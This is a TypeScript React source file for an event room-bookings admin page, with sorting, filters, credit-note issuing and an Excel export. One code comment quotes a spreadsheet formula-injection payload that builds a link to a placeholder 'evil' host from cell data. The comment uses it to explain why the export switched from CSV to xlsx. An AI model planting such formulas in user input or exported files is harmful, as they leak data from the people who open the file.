"use client";

import type { EventDayDefinition } from "@calcom/features/ne26-rooms/lib/eventSchedule";
import { trpc } from "@calcom/trpc/react";
import { useRouter } from "next/navigation";
import { buildXlsx, type CellValue } from "@calcom/features/ne26-rooms/lib/xlsx";
import { useMemo, useState } from "react";
import BookingCalendar from "./BookingCalendar";
import BookingSidePanel from "./BookingSidePanel";
import { EVENT_TIME_ZONE } from "@calcom/features/ne26-rooms/lib/eventSchedule";

const TZ = EVENT_TIME_ZONE;

export interface AdminBookingRow {
  uid: string;
  status: string;
  roomName: string;
  category: string;
  startUtc: string;
  endUtc: string;
  durationMinutes: number;
  bookerName: string;
  bookerEmail: string;
  amountTotal: number;
  currency: string;
  stripePaymentId: string | null;
  orderRoomCount: number;
  orderUid: string | null;
  /** When the order was placed, and when it was paid — different questions. */
  orderedAt: string;
  paidAt: string | null;
  invoiceNumber: string | null;
  creditNoteNumber: string | null;
  addOns: { name: string; quantity: number; lineTotal: number }[];
}

const STATUS_FILTERS = ["ALL", "CONFIRMED", "PENDING", "CANCELLED"] as const;
type StatusFilter = (typeof STATUS_FILTERS)[number];

const STATUS_BADGE: Record<string, string> = {
  CONFIRMED: "bg-green-100 text-green-700",
  PENDING: "bg-amber-100 text-amber-700",
  CANCELLED: "bg-gray-100 text-gray-500",
};

function fmtDate(iso: string): string {
  return new Intl.DateTimeFormat("en-GB", {
    timeZone: TZ,
    weekday: "short",
    day: "numeric",
    month: "short",
  }).format(new Date(iso));
}
/** "1 Sep, 20:15" — a moment, as opposed to the slot's day and time. */
function fmtDateTime(iso: string): string {
  return new Intl.DateTimeFormat("en-GB", {
    timeZone: TZ,
    day: "numeric",
    month: "short",
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  }).format(new Date(iso));
}
function fmtTime(iso: string): string {
  return new Intl.DateTimeFormat("en-GB", {
    timeZone: TZ,
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  }).format(new Date(iso));
}
function fmtMoney(cents: number, currency: string): string {
  return new Intl.NumberFormat("en-GB", { style: "currency", currency }).format(cents / 100);
}
// Sortable event-local calendar date (YYYY-MM-DD) used as the day-filter key.
function dayKey(iso: string): string {
  return new Intl.DateTimeFormat("en-CA", {
    timeZone: TZ,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).format(new Date(iso));
}
function addOnsLabel(row: AdminBookingRow): string {
  return row.addOns.map((a) => `${a.name}×${a.quantity}`).join(", ");
}

/**
 * The columns the accounting team works from, in the order they read them.
 *
 * This was a CSV, which meant a text-import dialog every time — which
 * separator, which encoding, and why "NE26-2026-0006" arrived as a date. An
 * .xlsx opens on a double click with its types intact.
 *
 * It also closes a hole the CSV had to patch by hand: a booker called
 * `=HYPERLINK("https://evil/"&A1,"click")` — and the name comes from whatever
 * the buyer typed at Stripe — executed when the team opened the file. A cell
 * written as an inline string is text to Excel, never a formula, so nothing
 * needs neutralising and nothing can be missed.
 */
type SortKey =
  | "room"
  | "when"
  | "status"
  | "booker"
  | "ordered"
  | "paid"
  | "addOns"
  | "amount"
  | "invoice"
  | "creditNote";

const SORTABLE_COLUMNS: { key: SortKey; label: string; align?: "right" }[] = [
  { key: "room", label: "Room" },
  { key: "when", label: "When (Istanbul)" },
  { key: "status", label: "Status" },
  { key: "booker", label: "Booker" },
  { key: "ordered", label: "Ordered" },
  { key: "paid", label: "Paid" },
  { key: "addOns", label: "Add-ons" },
  { key: "amount", label: "Amount", align: "right" },
  { key: "invoice", label: "Invoice" },
  { key: "creditNote", label: "Credit note" },
];

const EXPORT_HEADERS = [
  "Room",
  "Category",
  "Date (Istanbul)",
  "Start",
  "End",
  "Hours",
  "Status",
  "Booker name",
  "Booker email",
  "Ordered at",
  "Paid at",
  "Amount excl. VAT",
  "Currency",
  "Add-ons",
  "Payment ID",
  "Invoice",
  "Credit note",
];

function exportRows(rows: AdminBookingRow[]): CellValue[][] {
  return rows.map((r) => [
    r.roomName,
    r.category,
    fmtDate(r.startUtc),
    fmtTime(r.startUtc),
    fmtTime(r.endUtc),
    r.durationMinutes / 60,
    r.status,
    r.bookerName,
    r.bookerEmail,
    fmtDateTime(r.orderedAt),
    r.paidAt ? fmtDateTime(r.paidAt) : "",
    // A number, so the accountant can sum the column instead of retyping it.
    r.amountTotal / 100,
    r.currency,
    r.addOns.map((a) => `${a.name} x${a.quantity} (${(a.lineTotal / 100).toFixed(2)})`).join("; "),
    r.stripePaymentId,
    r.invoiceNumber,
    r.creditNoteNumber,
  ]);
}

export default function RoomsAdminView({
  rows,
  roomNames,
  slotGranularityMinutes,
  eventDays,
}: {
  rows: AdminBookingRow[];
  roomNames: string[];
  slotGranularityMinutes: number;
  eventDays: EventDayDefinition[];
}): JSX.Element {
  const [status, setStatus] = useState<StatusFilter>("ALL");
  const [query, setQuery] = useState("");
  const [roomFilter, setRoomFilter] = useState("ALL");
  const [dayFilter, setDayFilter] = useState("ALL");
  const [view, setView] = useState<"table" | "calendar">("table");
  const [selectedUid, setSelectedUid] = useState<string | null>(null);
  const router = useRouter();
  const [pendingUid, setPendingUid] = useState<string | null>(null);
  const [sort, setSort] = useState<{ key: SortKey; dir: "asc" | "desc" }>({
    key: "when",
    dir: "asc",
  });

  /** Same column again flips the direction; a new one starts ascending. */
  function sortBy(key: SortKey): void {
    setSort((s) => (s.key === key ? { key, dir: s.dir === "asc" ? "desc" : "asc" } : { key, dir: "asc" }));
  }
  const creditNote = trpc.viewer.rooms.issueCreditNote.useMutation({
    onSettled: () => setPendingUid(null),
    onSuccess: () => router.refresh(),
  });

  function onIssueCreditNote(row: AdminBookingRow): void {
    // A credit note is issued against the ORDER, not the room. This sent the
    // booking uid, so the service found nothing, returned false, and said
    // nothing — an admin refunded the card in Stripe believing the credit note
    // had gone out, and the buyer never received one.
    if (!row.orderUid) return;
    // And it cancels the WHOLE order: saying "the booking" understated the
    // damage on a three-room order.
    const scope =
      row.orderRoomCount > 1 ? `all ${row.orderRoomCount} rooms on this order` : `${row.roomName}`;
    const ok = window.confirm(
      `Issue a credit note for ${row.bookerName}? This cancels ${scope}, frees the slots, and emails the booker. Refund the payment in Stripe separately.`
    );
    if (!ok) return;
    setPendingUid(row.uid);
    creditNote.mutate({ uid: row.orderUid });
  }

  function renderCreditNoteCell(r: AdminBookingRow): JSX.Element {
    if (r.creditNoteNumber) {
      return (
        <a
          href={`/rooms/credit-note/${r.orderUid ?? r.uid}`}
          target="_blank"
          rel="noreferrer"
          className="text-[#000643] underline hover:opacity-80">
          {r.creditNoteNumber}
        </a>
      );
    }
    if (r.status === "CONFIRMED" && r.invoiceNumber) {
      return (
        <button
          type="button"
          onClick={() => onIssueCreditNote(r)}
          title={r.orderUid ? undefined : "This booking predates orders and has no credit note path."}
          disabled={pendingUid === r.uid || !r.orderUid}
          className="rounded-md border border-red-200 px-2 py-1 font-medium text-red-600 text-xs transition hover:border-red-400 disabled:opacity-50">
          {pendingUid === r.uid ? "Issuing…" : "Credit note"}
        </button>
      );
    }
    return <span className="text-gray-300">—</span>;
  }

  const rooms = useMemo(() => Array.from(new Set(rows.map((r) => r.roomName))).sort(), [rows]);
  const days = useMemo(() => {
    const map = new Map<string, string>();
    for (const r of rows) {
      const key = dayKey(r.startUtc);
      if (!map.has(key)) map.set(key, fmtDate(r.startUtc));
    }
    return Array.from(map.entries())
      .sort((a, b) => a[0].localeCompare(b[0]))
      .map(([key, label]) => ({ key, label }));
  }, [rows]);

  const filtered = useMemo(() => {
    const q = query.trim().toLowerCase();
    return rows.filter((r) => {
      if (status !== "ALL" && r.status !== status) return false;
      if (roomFilter !== "ALL" && r.roomName !== roomFilter) return false;
      if (dayFilter !== "ALL" && dayKey(r.startUtc) !== dayFilter) return false;
      if (q) {
        const hay =
          `${r.bookerName} ${r.bookerEmail} ${r.roomName} ${r.invoiceNumber ?? ""} ${r.creditNoteNumber ?? ""}`.toLowerCase();
        if (!hay.includes(q)) return false;
      }
      return true;
    });
  }, [rows, status, roomFilter, dayFilter, query]);
  /**
   * Every column sorts, because which one matters depends on the question.
   * Chasing an unpaid order is a sort by status; reconciling with the bank is a
   * sort by amount; preparing the day is a sort by time. The table opened in
   * time order and could only ever be read that way.
   */
  const sorted = useMemo(() => {
    const { key, dir } = sort;
    const sign = dir === "asc" ? 1 : -1;
    const value = (r: AdminBookingRow): string | number => {
      switch (key) {
        case "room":
          return r.roomName;
        case "status":
          return r.status;
        case "booker":
          return `${r.bookerName} ${r.bookerEmail}`;
        case "ordered":
          return r.orderedAt ?? "";
        case "paid":
          return r.paidAt ?? "";
        case "addOns":
          return r.addOns.length;
        case "amount":
          return r.amountTotal;
        case "invoice":
          return r.invoiceNumber ?? "";
        case "creditNote":
          return r.creditNoteNumber ?? "";
        default:
          return r.startUtc;
      }
    };
    // Copied before sorting: sort() mutates, and `filtered` is memoised.
    return [...filtered].sort((a, b) => {
      const av = value(a);
      const bv = value(b);
      if (typeof av === "number" && typeof bv === "number") return (av - bv) * sign;
      // Blank last whichever way the column is pointing — an unpaid booking has
      // no paid date, and burying those among the dates helps nobody.
      if (av === "" && bv !== "") return 1;
      if (bv === "" && av !== "") return -1;
      return String(av).localeCompare(String(bv), "en") * sign;
    });
  }, [filtered, sort]);

  const confirmed = useMemo(() => rows.filter((r) => r.status === "CONFIRMED"), [rows]);
  const revenue = confirmed.reduce((sum, r) => sum + r.amountTotal, 0);
  const currency = rows[0]?.currency ?? "EUR";
  const selectedBooking = selectedUid ? (rows.find((r) => r.uid === selectedUid) ?? null) : null;

  function downloadExcel(): void {
    const book = buildXlsx({
      sheetName: "Bookings",
      headers: EXPORT_HEADERS,
      rows: exportRows(sorted),
    });
    const blob = new Blob([book as BlobPart], {
      type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `ne26-bookings-${new Date().toISOString().slice(0, 10)}.xlsx`;
    a.click();
    URL.revokeObjectURL(url);
  }

  return (
    <div>
      <div className="flex flex-wrap items-end justify-between gap-3">
        <div>
          <h1 className="font-bold text-2xl text-[#000643]">Bookings admin</h1>
          <p className="mt-1 text-gray-600 text-sm">
            {rows.length} bookings · {confirmed.length} confirmed · {fmtMoney(revenue, currency)} collected
          </p>
        </div>
        <div className="flex flex-wrap gap-2">
          <a
            href="/api/ne26-rooms/export/documents"
            className="rounded-lg border border-[#000643] px-4 py-2 font-semibold text-[#000643] text-sm transition hover:bg-[#000643]/5">
            Download all invoices (ZIP)
          </a>
          <button
            type="button"
            onClick={downloadExcel}
            className="rounded-lg bg-[#000643] px-4 py-2 font-semibold text-sm text-white transition hover:opacity-90">
            Export Excel
          </button>
        </div>
      </div>

      <div className="mt-4 flex gap-2">
        {(["table", "calendar"] as const).map((v) => (
          <button
            key={v}
            type="button"
            onClick={() => setView(v)}
            className={`rounded-lg border px-3 py-1.5 font-medium text-sm transition ${
              v === view
                ? "border-[#000643] bg-[#000643] text-white"
                : "border-gray-200 bg-white text-black hover:border-[#000643]"
            }`}>
            {v === "table" ? "Table" : "Calendar"}
          </button>
        ))}
      </div>

      <div className="mt-3 flex gap-2">
        {STATUS_FILTERS.map((s) => (
          <button
            key={s}
            type="button"
            onClick={() => setStatus(s)}
            className={`rounded-lg border px-3 py-1.5 font-medium text-sm transition ${
              s === status
                ? "border-[#000643] bg-[#000643] text-white"
                : "border-gray-200 bg-white text-black hover:border-[#000643]"
            }`}>
            {s === "ALL" ? "All" : s.charAt(0) + s.slice(1).toLowerCase()}
          </button>
        ))}
      </div>

      <div className="mt-3 flex flex-wrap items-center gap-2">
        <input
          type="search"
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          placeholder="Search name, email, invoice…"
          className="min-w-56 flex-1 rounded-lg border border-gray-200 px-3 py-1.5 text-sm focus:border-[#000643] focus:outline-none"
        />
        <select
          value={roomFilter}
          onChange={(e) => setRoomFilter(e.target.value)}
          className="rounded-lg border border-gray-200 px-3 py-1.5 text-sm focus:border-[#000643] focus:outline-none">
          <option value="ALL">All rooms</option>
          {rooms.map((name) => (
            <option key={name} value={name}>
              {name}
            </option>
          ))}
        </select>
        <select
          value={dayFilter}
          onChange={(e) => setDayFilter(e.target.value)}
          className="rounded-lg border border-gray-200 px-3 py-1.5 text-sm focus:border-[#000643] focus:outline-none">
          <option value="ALL">All days</option>
          {days.map((d) => (
            <option key={d.key} value={d.key}>
              {d.label}
            </option>
          ))}
        </select>
        <span className="text-gray-400 text-xs">{filtered.length} shown</span>
      </div>

      {view === "calendar" ? (
        <div className="mt-4">
          <BookingCalendar
            rows={filtered}
            roomNames={roomNames}
            granularityMinutes={slotGranularityMinutes}
            eventDays={eventDays}
            selectedUid={selectedUid}
            onSelect={setSelectedUid}
          />
          {selectedBooking ? (
            <BookingSidePanel booking={selectedBooking} onClose={() => setSelectedUid(null)} />
          ) : null}
        </div>
      ) : (
        <div className="mt-4 overflow-x-auto rounded-xl border border-gray-200 bg-white">
          <table className="w-full text-left text-sm">
            <thead className="border-gray-100 border-b bg-gray-50 text-gray-500 text-xs uppercase">
              <tr>
                {SORTABLE_COLUMNS.map(({ key, label, align }) => (
                  <th key={key} className={`px-3 py-3 ${align === "right" ? "text-right" : ""}`}>
                    <button
                      type="button"
                      onClick={() => sortBy(key)}
                      aria-label={`Sort by ${label}`}
                      className={`inline-flex items-center gap-1 uppercase transition hover:text-[#000643] ${
                        sort.key === key ? "font-semibold text-[#000643]" : ""
                      }`}>
                      {label}
                      <span aria-hidden className={sort.key === key ? "" : "opacity-0"}>
                        {sort.dir === "asc" ? "▲" : "▼"}
                      </span>
                    </button>
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {sorted.length === 0 ? (
                <tr>
                  <td className="px-3 py-6 text-center text-gray-400" colSpan={8}>
                    No bookings
                  </td>
                </tr>
              ) : (
                sorted.map((r) => (
                  <tr
                    key={r.uid}
                    className="border-gray-200 border-b align-top transition last:border-0 hover:bg-[#000643]/[0.03]">
                    <td className="px-3 py-3">
                      <a
                        href={`/rooms/admin/${r.uid}`}
                        className="font-medium text-[#000643] hover:underline">
                        {r.roomName}
                      </a>
                      <div className="text-gray-400 text-xs">{r.category}</div>
                    </td>
                    <td className="px-3 py-3">
                      {fmtDate(r.startUtc)} · {fmtTime(r.startUtc)}–{fmtTime(r.endUtc)} (
                      {r.durationMinutes / 60}h)
                    </td>
                    <td className="px-3 py-3">
                      <span
                        className={`rounded-full px-2 py-0.5 font-medium text-xs ${STATUS_BADGE[r.status] ?? ""}`}>
                        {r.status}
                      </span>
                    </td>
                    <td className="px-3 py-3">
                      <div>{r.bookerName}</div>
                      <div className="text-gray-400 text-xs">{r.bookerEmail}</div>
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 text-gray-500 text-xs">
                      {fmtDateTime(r.orderedAt)}
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 text-gray-500 text-xs">
                      {r.paidAt ? fmtDateTime(r.paidAt) : "—"}
                    </td>
                    <td className="px-3 py-2 text-gray-600">{addOnsLabel(r) || "—"}</td>
                    <td className="px-3 py-2 text-right font-medium">
                      {fmtMoney(r.amountTotal, r.currency)}
                    </td>
                    <td className="px-3 py-3">
                      {r.invoiceNumber ? (
                        <a
                          href={`/rooms/invoice/${r.orderUid ?? r.uid}`}
                          target="_blank"
                          rel="noreferrer"
                          className="text-[#000643] underline hover:opacity-80">
                          {r.invoiceNumber}
                        </a>
                      ) : (
                        <span className="text-gray-300">—</span>
                      )}
                    </td>
                    <td className="px-3 py-3">{renderCreditNoteCell(r)}</td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
